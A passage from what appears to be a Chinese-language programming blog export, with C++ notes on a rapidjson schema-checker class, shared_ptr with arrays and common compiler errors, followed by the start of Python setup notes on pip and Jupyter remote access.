<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ITest.hpp</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ITest</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func_public</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestFactory</span> &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> ITest *<span class="title">create</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TestImpl.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ITest.hpp&quot;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> : <span class="keyword">public</span> ITest &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func_public</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_a = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ITest *<span class="title">TestFactory::create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="12-json-的处理"><a href="#12-json-的处理" class="headerlink" title="12. json 的处理"></a>12. json 的处理</h2><h3 id="12-1-schema-校验"><a href="#12-1-schema-校验" class="headerlink" title="12.1. schema 校验"></a>12.1. schema 校验</h3><ul>
<li>使用 rapidjson 可以校验 schema</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用法</span></span><br><span class="line">HttpJsonChecker checker;</span><br><span class="line">checker.<span class="built_in">on</span>(<span class="string">&quot;anykey&quot;</span>, schema);</span><br><span class="line"><span class="comment">// apply失败会抛异常</span></span><br><span class="line">checker.<span class="built_in">apply</span>(<span class="string">&quot;anykey&quot;</span>, jsonStr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @file HttpJsonChecker.hpp</span></span><br><span class="line"><span class="comment"> * @author dailin (dailin1989ok@163.com)</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * @version 1.0</span></span><br><span class="line"><span class="comment"> * @date 2019-12-06</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @copyright Copyright (c) 2019</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __JSON_CHECKER_HPP__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __JSON_CHECKER_HPP__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;system_error&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;rapidjson/error/en.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;rapidjson/schema.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;rapidjson/rapidjson.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;rapidjson/stringbuffer.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LINK_BREAK</span></span><br><span class="line">    <span class="meta">#<span class="keyword">undef</span> LINK_BREAK</span></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> _WINDOWS</span></span><br><span class="line">            <span class="meta">#<span class="keyword">define</span> LINK_BREAK  <span class="string">&quot;\r\n&quot;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="meta">#<span class="keyword">define</span> LINK_BREAK  <span class="string">&quot;\n&quot;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief jsonchecker错误分类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_rapidjson_category</span> : <span class="keyword">public</span> std::error_category &#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">const</span> _rapidjson_category&amp; <span class="title">instance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">static</span> _rapidjson_category instance;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">name</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">noexcept</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jonschecker_category&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::string <span class="title">message</span><span class="params">(<span class="type">int</span> _Errval)</span> <span class="type">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rapidjson::<span class="built_in">GetParseError_En</span>((rapidjson::ParseErrorCode)_Errval);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">const</span> std::error_category&amp; <span class="title">rapidjson_category</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _rapidjson_category::<span class="built_in">instance</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief json格式校验器，依赖rapidjson.schema</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HttpJsonChecker</span> &#123;</span><br><span class="line">    <span class="keyword">typedef</span> std::shared_ptr&lt;rapidjson::SchemaDocument&gt; SchemaDocumentPtr;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* schema, <span class="type">const</span> std::string&amp; json)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HttpJsonChecker jsonChecker;</span><br><span class="line">            jsonChecker</span><br><span class="line">                .<span class="built_in">on</span>(<span class="string">&quot;any&quot;</span>, schema)</span><br><span class="line">                .<span class="built_in">apply</span>(<span class="string">&quot;any&quot;</span>, json);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">const</span> std::string&amp; schema, <span class="type">const</span> std::string&amp; json)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HttpJsonChecker::<span class="built_in">check</span>(schema.<span class="built_in">c_str</span>(), json);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 将schema字符串存储，以便在调用apply使用key对应的schema进行校验</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param key 关键key</span></span><br><span class="line"><span class="comment">    * @param jsonschema jsonschema字符串，空字符串时表示此key不做校验</span></span><br><span class="line"><span class="comment">    * @return json_checker&amp; json_checker的引用，以便链式调用</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @throw std::error_code 错误信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">HttpJsonChecker&amp; <span class="title">on</span><span class="params">(<span class="type">const</span> std::string&amp; key, <span class="type">const</span> std::string&amp; jsonschema)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">on</span>(key, jsonschema.<span class="built_in">c_str</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 将schema字符串存储，以便在调用apply使用key对应的schema进行校验</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param key 关键key</span></span><br><span class="line"><span class="comment">    * @param jsonschema jsonschema字符串，空指针或空字符串时表示此key不做校验</span></span><br><span class="line"><span class="comment">    * @return json_checker&amp; json_checker的引用，以便链式调用</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @throw std::error_code 错误信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">HttpJsonChecker&amp; <span class="title">on</span><span class="params">(<span class="type">const</span> std::string&amp; key, <span class="type">const</span> <span class="type">char</span>* jsonschema)</span> </span>&#123;</span><br><span class="line">        std::string k = <span class="built_in">transform</span>(key);</span><br><span class="line">        <span class="comment">// 空指针，或空字符串标识对应的key不做格式校验</span></span><br><span class="line">        <span class="keyword">if</span> ((jsonschema == <span class="literal">nullptr</span>) || (<span class="built_in">strlen</span>(jsonschema) == <span class="number">0</span>)) &#123;</span><br><span class="line">            m_shcemaDocuments.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(k, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::string schemaStr = jsonschema;</span><br><span class="line"></span><br><span class="line">        rapidjson::Document doc;</span><br><span class="line">        <span class="keyword">if</span> (doc.<span class="built_in">Parse</span>(jsonschema).<span class="built_in">HasParseError</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::<span class="built_in">error_code</span>(doc.<span class="built_in">GetParseError</span>(), <span class="built_in">rapidjson_category</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        m_shcemaDocuments.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(k, jsonschema));</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 对参数json应用key所对应的schema进行校验</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param key 对应的key</span></span><br><span class="line"><span class="comment">    * @param json 需要校验的json字符串</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @throw std::string 错误信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">apply</span><span class="params">(<span class="type">const</span> std::string&amp; key, <span class="type">const</span> std::string&amp; json)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">apply</span>(key, json.<span class="built_in">c_str</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 对参数json应用key所对应的schema进行校验</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param key 对应的key</span></span><br><span class="line"><span class="comment">    * @param json 需要校验的json字符串</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @throw std::string 错误信息</span></span><br><span class="line"><span class="comment">    * @throw std::error_code 错误信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">apply</span><span class="params">(<span class="type">const</span> std::string&amp; key, <span class="type">const</span> <span class="type">char</span>* json)</span> </span>&#123;</span><br><span class="line">        rapidjson::Document doc;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* content = <span class="built_in">strlen</span>(json) == <span class="number">0</span> ? <span class="string">&quot;&#123;&#125;&quot;</span> : json;</span><br><span class="line">        <span class="keyword">if</span> (doc.<span class="built_in">Parse</span>(content).<span class="built_in">HasParseError</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::<span class="built_in">error_code</span>(doc.<span class="built_in">GetParseError</span>(), <span class="built_in">rapidjson_category</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">apply</span>(key, doc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 对参数json应用key所对应的schema进行校验</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @param key 对应的key</span></span><br><span class="line"><span class="comment">    * @param doc rapidjson::Document的引用</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @throw std::string 错误信息</span></span><br><span class="line"><span class="comment">    * @throw std::error_code 错误信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">apply</span><span class="params">(<span class="type">const</span> std::string&amp; key, <span class="type">const</span> rapidjson::Document&amp; doc)</span> </span>&#123;</span><br><span class="line">        std::string k = <span class="built_in">transform</span>(key);</span><br><span class="line">        <span class="keyword">auto</span> found = m_shcemaDocuments.<span class="built_in">find</span>(k);</span><br><span class="line">        <span class="keyword">if</span> (found == m_shcemaDocuments.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            std::string message = <span class="string">&quot;not found key: &quot;</span> + key;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">//throw message;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (doc.<span class="built_in">HasParseError</span>()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::<span class="built_in">error_code</span>(doc.<span class="built_in">GetParseError</span>(), <span class="built_in">rapidjson_category</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SchemaDocumentPtr schemaDoc = <span class="built_in">SchemaDocumentPtr</span>();</span><br><span class="line">        rapidjson::Document tmpDoc;</span><br><span class="line">        <span class="keyword">auto</span> json = found-&gt;second;</span><br><span class="line">        <span class="keyword">if</span> (!json.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmpDoc.<span class="built_in">Parse</span>(json.<span class="built_in">c_str</span>()).<span class="built_in">HasParseError</span>()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> std::<span class="built_in">error_code</span>(doc.<span class="built_in">GetParseError</span>(), <span class="built_in">rapidjson_category</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            schemaDoc = std::<span class="built_in">make_shared</span>&lt;rapidjson::SchemaDocument&gt;(tmpDoc);</span><br><span class="line">        &#125;</span><br><span class="line">        std::string message;</span><br><span class="line">        <span class="keyword">if</span> (!schemaDoc) <span class="keyword">return</span>;         <span class="comment">// 空指针不做校验</span></span><br><span class="line">        <span class="function">rapidjson::SchemaValidator <span class="title">validator</span><span class="params">(*schemaDoc.get())</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (!doc.<span class="built_in">Accept</span>(validator)) &#123;</span><br><span class="line">            rapidjson::StringBuffer sb;</span><br><span class="line">            validator.<span class="built_in">GetInvalidSchemaPointer</span>().<span class="built_in">StringifyUriFragment</span>(sb);</span><br><span class="line">            message += <span class="string">&quot;Invalid schema: &quot;</span> + std::<span class="built_in">string</span>(sb.<span class="built_in">GetString</span>());</span><br><span class="line">            message += LINK_BREAK;</span><br><span class="line">            message += <span class="string">&quot;Invalid keyword: &quot;</span> + std::<span class="built_in">string</span>(validator.<span class="built_in">GetInvalidSchemaKeyword</span>());</span><br><span class="line">            message += LINK_BREAK;</span><br><span class="line">            sb.<span class="built_in">Clear</span>();</span><br><span class="line">            validator.<span class="built_in">GetInvalidDocumentPointer</span>().<span class="built_in">StringifyUriFragment</span>(sb);</span><br><span class="line">            message += <span class="string">&quot;Invalid document: &quot;</span> + std::<span class="built_in">string</span>(sb.<span class="built_in">GetString</span>());</span><br><span class="line">            message += LINK_BREAK;</span><br><span class="line">            <span class="keyword">throw</span> message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 获取所有的Key</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * @return std::vector&lt;std::string&gt; key数组</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">std::vector&lt;std::string&gt; <span class="title">getKeys</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        std::vector&lt;std::string&gt; keys;</span><br><span class="line">        std::for_each(m_shcemaDocuments.<span class="built_in">begin</span>(), m_shcemaDocuments.<span class="built_in">end</span>(),</span><br><span class="line">            [&amp;keys](<span class="type">const</span> std::pair&lt;std::string, std::string&gt;&amp; k)</span><br><span class="line">        &#123;</span><br><span class="line">            keys.<span class="built_in">push_back</span>(k.first);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> keys;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * @brief 清空所有检测规则</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        m_shcemaDocuments.<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    <span class="function">std::string <span class="title">transform</span><span class="params">(<span class="type">const</span> std::string&amp; str)</span> </span>&#123;</span><br><span class="line">        std::string s = str;</span><br><span class="line">        std::<span class="built_in">transform</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), s.<span class="built_in">begin</span>(),</span><br><span class="line">            [](<span class="type">int</span> ch) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> ::<span class="built_in">tolower</span>(ch);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line"><span class="comment">//        std::map&lt;std::string, SchemaDocumentPtr&gt; m_shcemaDocuments;</span></span><br><span class="line">    std::map&lt;std::string, std::string&gt; m_shcemaDocuments;</span><br><span class="line">&#125;; <span class="comment">// json_checker</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> LINK_BREAK</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __JSON_CHECKER_HPP__</span></span></span><br></pre></td></tr></table></figure>

<h3 id="12-2-json-转结构体"><a href="#12-2-json-转结构体" class="headerlink" title="12.2. json 转结构体"></a>12.2. json 转结构体</h3><ul>
<li>步骤就是使用 js 生成一个支持 rttr 协议的结构体，然后使用 rttr 进行转换</li>
<li>下面是使用的代码，依赖库 rttr，其中<code>events/aclProcess.h</code>是生成的</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ev_tunnel_access.json就是模板json</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xxx.events是命名空间，生成的头文件和cpp文件在/path/to/events目录下</span></span><br><span class="line">node dist/quickjson.js -p data/events/ev_tunnel_access.json -d /path/to/events -n xxx.events -f</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;events/aclProcess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;from_json.h&gt;</span></span></span><br><span class="line"><span class="keyword">if</span> (!io::<span class="built_in">from_json</span>(content, xxx::events::aclProcess)) &#123;</span><br><span class="line">    <span class="built_in">LOGE3</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;deserialized aclProcess json to struct fail,aclProcess:&#123;&#125;&quot;</span>, content),</span><br><span class="line">          NO_REASON,</span><br><span class="line">          JSON_PARSE_ERROR_HOW_TO);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="13-共享指针指向数组的问题"><a href="#13-共享指针指向数组的问题" class="headerlink" title="13. 共享指针指向数组的问题"></a>13. 共享指针指向数组的问题</h2><p>参考<a href="https://www.cnblogs.com/apocelipes/p/10346928.html">shared_ptr和动态数组</a></p>
<h3 id="13-1-问题代码"><a href="#13-1-问题代码" class="headerlink" title="13.1. 问题代码"></a>13.1. 问题代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">uint8_t</span>&gt; <span class="title">pData</span><span class="params">(<span class="keyword">new</span> <span class="type">uint8_t</span>[size])</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="13-2-问题原因"><a href="#13-2-问题原因" class="headerlink" title="13.2. 问题原因"></a>13.2. 问题原因</h3><ul>
<li>对于<code>shared_ptr</code>来说，认为申请的只是一个<code>uint8_t</code>类型，所以删除仅调用<code>delete pData</code></li>
<li>但是对于数组类型，应该要调用<code>delete []pData</code>，所以将会出现未定义行为，可能存在问题</li>
</ul>
<h4 id="实测验证"><a href="#实测验证" class="headerlink" title="实测验证"></a>实测验证</h4><ul>
<li>对于基本类型，delete会自动释放后续空间，所以调用<code>delete pData</code>和<code>delete []pData</code>一个效果，但是不建议第一种</li>
<li>对于存在构造函数的类就不同了</li>
<li>存在析构函数的类，<code>delete pData</code>会进行清理，但是只会调用第一个元素的析构函数，后续元素不会调用析构函数，释放空间会导致崩溃</li>
<li>不存在析构函数的类，调用和<code>delete []pData</code>一个效果，也不建议用</li>
</ul>
<h3 id="13-3-解决方案"><a href="#13-3-解决方案" class="headerlink" title="13.3. 解决方案"></a>13.3. 解决方案</h3><ul>
<li>三种方式</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++17及以上支持</span></span><br><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">uint8_t</span>[]&gt; <span class="title">pData</span><span class="params">(<span class="keyword">new</span> <span class="type">uint8_t</span>[size])</span></span>;</span><br><span class="line"><span class="comment">// C++17以下</span></span><br><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">uint8_t</span>&gt; <span class="title">pData</span><span class="params">(<span class="keyword">new</span> <span class="type">uint8_t</span>[size], std::default_delete&lt;<span class="type">uint8_t</span>[]&gt;())</span></span>;</span><br><span class="line"><span class="comment">// vector不香吗</span></span><br><span class="line">std::shared_ptr&lt;std::vector&lt;<span class="type">uint8_t</span>&gt;&gt; pData;</span><br></pre></td></tr></table></figure>

<h2 id="14-几种编译错误原因"><a href="#14-几种编译错误原因" class="headerlink" title="14. 几种编译错误原因"></a>14. 几种编译错误原因</h2><h3 id="14-1-undefined-reference-to-vtable-for-xxx"><a href="#14-1-undefined-reference-to-vtable-for-xxx" class="headerlink" title="14.1. undefined reference to vtable for xxx"></a>14.1. undefined reference to <code>vtable for xxx</code></h3><ul>
<li>一般是父类存在纯虚函数子类没有实现导致</li>
</ul>
<h3 id="14-2-error-LNK2001-unresolved-external-symbol-x"><a href="#14-2-error-LNK2001-unresolved-external-symbol-x" class="headerlink" title="14.2. error LNK2001: unresolved external symbol x"></a>14.2. <code>error LNK2001: unresolved external symbol x</code></h3><ul>
<li>某个文件使用了外部的一个符号，链接的时候，找不到外部符号</li>
</ul>
<h3 id="14-3-fatal-error-C1004-unexpected-end-of-file-found"><a href="#14-3-fatal-error-C1004-unexpected-end-of-file-found" class="headerlink" title="14.3. fatal error C1004: unexpected end of file found"></a>14.3. <code>fatal error C1004: unexpected end of file found</code></h3><ul>
<li>某个括号没有闭合，导致找另一半没找到找到了文件结束</li>
</ul>
<h3 id="14-4-error-C2371-xxx-redefinition-different-basic-types"><a href="#14-4-error-C2371-xxx-redefinition-different-basic-types" class="headerlink" title="14.4. error C2371: &#39;xxx&#39;: redefinition; different basic types"></a>14.4. <code>error C2371: &#39;xxx&#39;: redefinition; different basic types</code></h3><ul>
<li>一般是某个函数在调用时没有定义，编译器按照默认的<code>int xxx()</code>去识别</li>
<li>当后面此函数被真实定义时，发现和编译器的默认不一致，就报此错误</li>
</ul>
<h2 id="15-std-this-thread-sleep-for调整系统时间导致睡眠时间加长"><a href="#15-std-this-thread-sleep-for调整系统时间导致睡眠时间加长" class="headerlink" title="15. std::this_thread::sleep_for调整系统时间导致睡眠时间加长"></a>15. <code>std::this_thread::sleep_for</code>调整系统时间导致睡眠时间加长</h2><ul>
<li>标准库中的<code>sleep_for</code>实现是使用的当前系统时间进行的睡眠，如果在睡眠过程中调整系统时间可能导致睡眠时间很长或很短</li>
<li>如果想要和系统时间无关的睡眠，建议使用内核的系统调用，如linux下的<code>sleep()</code></li>
<li>想要跨平台调用，建议使用boost库的睡眠，只需要将std修改为boost即可</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>python学习笔记</title>
    <url>/blogs/2018-09-16-pythonStudy/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python 3.6.4</span><br></pre></td></tr></table></figure>

<h1 id="一、安装配置"><a href="#一、安装配置" class="headerlink" title="一、安装配置"></a>一、安装配置</h1><h2 id="1-pip包管理器"><a href="#1-pip包管理器" class="headerlink" title="1. pip包管理器"></a>1. pip包管理器</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1. 安装"></a>1.1. 安装</h3><p>安装相应python的版本的pip</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">ln -s /usr/bin/pip3 /usr/bin/pip    # 将pip3使用pip命令代替，创建一个快捷方式</span><br></pre></td></tr></table></figure>

<h3 id="1-2-配置pip源"><a href="#1-2-配置pip源" class="headerlink" title="1.2. 配置pip源"></a>1.2. 配置pip源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h3 id="1-3-生成requirements-txt"><a href="#1-3-生成requirements-txt" class="headerlink" title="1.3. 生成requirements.txt"></a>1.3. 生成requirements.txt</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<h3 id="1-4-pip安装失败，无法再使用pip怎么办"><a href="#1-4-pip安装失败，无法再使用pip怎么办" class="headerlink" title="1.4. pip安装失败，无法再使用pip怎么办"></a>1.4. pip安装失败，无法再使用pip怎么办</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复本地的pip</span></span><br><span class="line">python -m ensurepip</span><br></pre></td></tr></table></figure>

<h2 id="2-jupyter-notebook"><a href="#2-jupyter-notebook" class="headerlink" title="2. jupyter notebook"></a>2. jupyter notebook</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><p>使用pip安装没有找到怎么命令行调用，使用apt可以直接命令行调用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install jupyter-notebook</span><br></pre></td></tr></table></figure>

<h3 id="2-2-配置远程访问"><a href="#2-2-配置远程访问" class="headerlink" title="2.2. 配置远程访问"></a>2.2. 配置远程访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~|⇒ jupyter notebook --generate-config      # 生成jupyter配置文件</span><br><span class="line">Writing default config to: /home/you/.jupyter/jupyter_notebook_config.py</span><br><span class="line">~|⇒ jupyter notebook password               # 设置远程访问密码</span><br><span class="line">Enter password:</span><br><span class="line">Verify password:</span><br><span class="line">[NotebookPasswordApp] Wrote hashed password to /home/wangyubo/.jupyter/jupyter_notebook_config.json</span><br></pre></td></tr></table></figure>

<p>编辑<code>jupyter_notebook_config.py</code>，找到以下配置，改成这样</p>
